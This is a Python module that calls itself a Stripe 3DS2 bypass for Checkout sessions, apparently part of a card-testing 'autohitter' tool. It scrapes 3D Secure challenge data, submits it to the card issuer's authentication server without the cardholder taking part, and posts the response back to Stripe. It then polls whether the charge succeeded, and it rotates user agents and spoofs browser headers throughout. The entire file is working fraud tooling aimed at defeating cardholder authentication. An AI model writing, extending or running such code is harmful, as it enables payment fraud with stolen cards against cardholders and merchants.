"""
Fixed Stripe 3DS2 Bypass Module for Stripe CHECKOUT
Handles 3DS challenge completion through Checkout API (not raw PI API).
"""
import asyncio
import aiohttp
import base64
import json
import logging
import re
import random
import time
from urllib.parse import unquote, urlparse, parse_qs, urlencode
from typing import Dict, Optional

logger = logging.getLogger('autohitter')


class Stripe3DSBypass:
    """
    Handles 3DS2 completion for Stripe CHECKOUT sessions.
    CRITICAL: Must use the SAME session that created the PaymentIntent.
    Uses Checkout API endpoints, NOT raw PaymentIntent confirm.
    """

    def __init__(self, session: aiohttp.ClientSession, pk: str):
        self.session = session
        self.pk = pk
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]

    def _headers(self, origin="https://js.stripe.com", referer="https://js.stripe.com/"):
        return {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": origin,
            "referer": referer,
            "user-agent": random.choice(self.user_agents),
            "authorization": f"Bearer {self.pk}"
        }

    def _browser_headers(self):
        return {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        }

    async def _fetch_3ds_page(self, url: str) -> Dict:
        """Fetch 3DS redirect page and extract challenge data."""
        try:
            logger.info(f"Fetching 3DS page: {url[:100]}...")
            
            # Use browser-like headers with proper referer
            headers = {
                "User-Agent": random.choice(self.user_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Referer": "https://checkout.stripe.com/",
                "Origin": "https://checkout.stripe.com",
            }
            
            async with self.session.get(url, headers=headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                html = await resp.text()
                final_url = str(resp.url)
                logger.info(f"3DS page response: status={resp.status}, len={len(html)}, final_url={final_url[:100]}")
                
                # Log cookies for debugging
                cookies = {k: v for k, v in self.session.cookie_jar.filter_cookies(resp.url).items()}
                logger.debug(f"Session cookies: {list(cookies.keys())}")

                data = {}

                # Extract from URL fragment
                if '#' in final_url:
                    fragment = final_url.split('#')[1]
                    try:
                        decoded = unquote(fragment)
                        if '=' in decoded:
                            for pair in decoded.split('&'):
                                if '=' in pair:
                                    k, v = pair.split('=', 1)
                                    data[k] = unquote(v)
                    except:
                        pass

                # Parse query params
                parsed = urlparse(final_url)
                query = parse_qs(parsed.query)
                for k, v in query.items():
                    if v:
                        data[k] = v[0]

                # Extract from HTML
                patterns = [
                    (r'"threeDSServerTransID"\s*:\s*"([^"]+)"', 'threeDSServerTransID'),
                    (r'"acsUrl"\s*:\s*"([^"]+)"', 'acsUrl'),
                    (r'"creq"\s*:\s*"([^"]+)"', 'creq'),
                    (r'"cres"\s*:\s*"([^"]+)"', 'cres'),
                    (r'"TermUrl"\s*:\s*"([^"]+)"', 'TermUrl'),
                    (r'"transStatus"\s*:\s*"([^"]+)"', 'transStatus'),
                    (r'creq["\']?\s*[:=]\s*["\']([^"\']+)["\']', 'creq'),
                    (r'acsUrl["\']?\s*[:=]\s*["\']([^"\']+)["\']', 'acsUrl'),
                ]
                for pattern, key in patterns:
                    match = re.search(pattern, html)
                    if match and key not in data:
                        data[key] = match.group(1)

                # Extract form data
                form_match = re.search(r'<form[^>]*action=["\']([^"\']+)["\'][^>]*>(.*?)</form>', html, re.DOTALL)
                if form_match:
                    data['acsUrl'] = form_match.group(1)
                    form_html = form_match.group(2)
                    for name, value in re.findall(r'name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', form_html):
                        data[name] = value

                # Look for JSON data in script tags
                script_match = re.search(r'window\.__STRIPE_3DS_DATA__\s*=\s*(\{[^;]+\})', html)
                if script_match:
                    try:
                        json_data = json.loads(script_match.group(1))
                        data.update(json_data)
                    except:
                        pass
                
                # Also look for any JSON in script tags
                script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
                for script in script_matches:
                    if 'threeDSServerTransID' in script or 'acsUrl' in script:
                        try:
                            json_match = re.search(r'\{[^}]*"threeDSServerTransID"[^}]*\}', script)
                            if json_match:
                                json_data = json.loads(json_match.group(0))
                                for k, v in json_data.items():
                                    if k not in data:
                                        data[k] = v
                        except:
                            pass

                logger.info(f"Extracted 3DS data keys: {list(data.keys())}")
                return {"html": html, "final_url": final_url, "data": data, "status": resp.status}
        except Exception as e:
            logger.error(f"Fetch 3DS page error: {type(e).__name__}: {e}")
            import traceback
            logger.error(traceback.format_exc())
            return {"html": "", "final_url": url, "data": {}, "status": 0, "error": str(e)}

    async def _submit_challenge(self, acs_url: str, creq: str, term_url: Optional[str] = None) -> Dict:
        """Submit challenge request to ACS."""
        try:
            form_data = {"creq": creq}
            if term_url:
                form_data["TermUrl"] = term_url

            parsed = urlparse(acs_url)
            origin = f"{parsed.scheme}://{parsed.netloc}"

            headers = {
                "User-Agent": random.choice(self.user_agents),
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": origin,
                "Referer": acs_url,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            }

            async with self.session.post(
                acs_url,
                headers=headers,
                data=form_data,
                allow_redirects=True
            ) as resp:
                text = await resp.text()
                logger.debug(f"ACS response: status={resp.status}, len={len(text)}")

                result = {"status": resp.status, "text": text, "final_url": str(resp.url)}

                # Extract CRes
                cres_match = re.search(r'"cres"\s*:\s*"([^"]+)"', text)
                if not cres_match:
                    cres_match = re.search(r'cres=([^&\s]+)', text)
                if cres_match:
                    result["cres"] = cres_match.group(1)

                # Extract transStatus
                ts_match = re.search(r'"transStatus"\s*:\s*"([^"]+)"', text)
                if ts_match:
                    result["transStatus"] = ts_match.group(1)

                return result
        except Exception as e:
            logger.error(f"Challenge submit error: {e}")
            return {"status": 0, "error": str(e)}

    async def _post_cres_to_stripe(self, term_url: str, cres: str) -> Dict:
        """Post CRes back to Stripe's TermUrl."""
        try:
            headers = {
                "User-Agent": random.choice(self.user_agents),
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            }
            async with self.session.post(
                term_url,
                headers=headers,
                data={"cres": cres},
                allow_redirects=True
            ) as resp:
                text = await resp.text()
                logger.debug(f"CRes post: status={resp.status}, len={len(text)}, final_url={str(resp.url)[:80]}")
                return {"status": resp.status, "text": text, "final_url": str(resp.url)}
        except Exception as e:
            logger.error(f"CRes post error: {e}")
            return {"status": 0, "error": str(e)}

    async def _check_pi_status(self, pi_id: str, pi_client_secret: str) -> Dict:
        """Check PaymentIntent status without re-confirming."""
        try:
            url = f"https://api.stripe.com/v1/payment_intents/{pi_id}"
            params = {"client_secret": pi_client_secret}
            
            async with self.session.get(url, headers=self._headers(), params=params) as resp:
                data = await resp.json()
                status = data.get("status", "")
                logger.debug(f"PI status check: {status}")
                return {
                    "success": status == "succeeded",
                    "status": status,
                    "data": data
                }
        except Exception as e:
            logger.error(f"PI status check error: {e}")
            return {"success": False, "status": "error", "error": str(e)}

    async def bypass(self, redirect_url: str, pi_id: str, pi_client_secret: str, cs: str, pm_id: str, checksum: str, total: int, subtotal: int, customer_id: str = None) -> Dict:
        """
        Main 3DS bypass entry point for Stripe CHECKOUT.
        Uses browser emulation for challenge, then polls PI status.
        
        CRITICAL: Do NOT re-confirm with the same PM — it's already used!
        After challenge completion, Stripe auto-updates the PI status.
        We just need to poll for the result.
        
        Args:
            redirect_url: The 3DS redirect URL from next_action
            pi_id: PaymentIntent ID
            pi_client_secret: PI client secret
            cs: Checkout session ID (cs_live_...)
            pm_id: PaymentMethod ID (already used in initial confirm)
            checksum: init_checksum from checkout init
            total: expected amount in cents
            subtotal: subtotal in cents
        
        Returns: {"success": bool, "status": str, "error": str, "details": dict}
        """
        result = {
            "success": False,
            "status": "pending",
            "error": None,
            "details": {}
        }

        try:
            logger.info(f"Starting 3DS bypass for Checkout PI: {pi_id[:20]}...")

            # Step 1: Fetch the 3DS redirect page to get challenge data
            logger.info(f"Fetching 3DS redirect page...")
            page = await self._fetch_3ds_page(redirect_url)
            result["details"]["page_fetch"] = {"status": page.get("status"), "keys": list(page.get("data", {}).keys())}

            data = page.get("data", {})

            # Check if frictionless (no challenge needed)
            if not data.get("creq") and not data.get("acsUrl"):
                logger.info("No challenge data — 3DS may be frictionless or already complete")
                # Poll PI status instead of re-confirming
                for attempt in range(3):
                    await asyncio.sleep(1)
                    status_check = await self._check_pi_status(pi_id, pi_client_secret)
                    if status_check["success"]:
                        result["success"] = True
                        result["status"] = "succeeded"
                        result["details"]["method"] = "frictionless_poll"
                        logger.info("3DS bypassed frictionlessly — PI succeeded!")
                        return result
                    elif status_check["status"] not in ["requires_action", "pending"]:
                        break
                
                result["error"] = "No challenge data and PI not succeeded"
                result["status"] = "no_challenge"
                logger.warning(f"Frictionless flow failed: PI status = {status_check.get('status')}")
                return result

            acs_url = data.get("acsUrl", "")
            creq = data.get("creq", "")
            term_url = data.get("TermUrl", "")

            if not acs_url or not creq:
                result["error"] = f"Missing challenge data: acsUrl={bool(acs_url)}, creq={bool(creq)}"
                result["details"]["extracted_data"] = data
                logger.error(result["error"])
                return result

            # Step 2: Submit challenge to ACS
            logger.info(f"Submitting challenge to ACS: {acs_url[:60]}...")
            challenge = await self._submit_challenge(acs_url, creq, term_url)
            result["details"]["challenge"] = {
                "status": challenge.get("status"),
                "has_cres": bool(challenge.get("cres")),
                "transStatus": challenge.get("transStatus")
            }

            trans_status = challenge.get("transStatus")

            # Step 3: Handle challenge result
            if trans_status in ["Y", "A"]:
                logger.info(f"3DS authenticated: transStatus={trans_status}")

                # Post CRes if available
                if challenge.get("cres") and term_url:
                    logger.info("Posting CRes to TermUrl...")
                    cres_result = await self._post_cres_to_stripe(term_url, challenge["cres"])
                    result["details"]["cres_post"] = {"status": cres_result.get("status")}
                    
                    # After posting CRes, Stripe redirects to return_url
                    # We need to follow that and then poll PI status
                    await asyncio.sleep(2)

                # CRITICAL: Do NOT re-confirm! The PM is already used.
                # Instead, poll the PI status to see if Stripe auto-completed it.
                logger.info("Polling PI status after challenge...")
                for attempt in range(5):
                    status_check = await self._check_pi_status(pi_id, pi_client_secret)
                    logger.debug(f"PI poll attempt {attempt+1}: status={status_check.get('status')}")
                    
                    if status_check["success"]:
                        result["success"] = True
                        result["status"] = "succeeded"
                        result["details"]["method"] = "challenge_completed_poll"
                        result["details"]["poll_attempts"] = attempt + 1
                        logger.info("3DS bypass SUCCESSFUL — PI auto-completed after challenge!")
                        return result
                    
                    if status_check.get("status") == "requires_payment_method":
                        result["error"] = "Card declined after 3DS challenge"
                        result["status"] = "declined"
                        return result
                    
                    await asyncio.sleep(1)

                result["error"] = "Challenge completed but PI did not succeed after polling"
                result["status"] = "poll_timeout"

            elif trans_status == "C":
                result["error"] = "Additional challenge required (transStatus=C) — cannot bypass"
                result["status"] = "challenge_cont"
            elif trans_status == "N":
                result["error"] = "3DS not authenticated (transStatus=N)"
                result["status"] = "not_authenticated"
            else:
                # No transStatus — try CRes fallback
                if challenge.get("cres") and term_url:
                    logger.info("No transStatus but CRes found, posting...")
                    await self._post_cres_to_stripe(term_url, challenge["cres"])
                    await asyncio.sleep(2)
                    
                    # Poll PI status
                    for attempt in range(5):
                        status_check = await self._check_pi_status(pi_id, pi_client_secret)
                        if status_check["success"]:
                            result["success"] = True
                            result["status"] = "succeeded"
                            result["details"]["method"] = "cres_fallback_poll"
                            return result
                        await asyncio.sleep(1)

                result["error"] = f"Unexpected 3DS result: transStatus={trans_status}"
                result["status"] = "unknown"
                result["details"]["acs_response_preview"] = challenge.get("text", "")[:500]

        except Exception as e:
            logger.error(f"3DS bypass fatal error: {e}")
            result["error"] = str(e)
            result["status"] = "error"

        return result
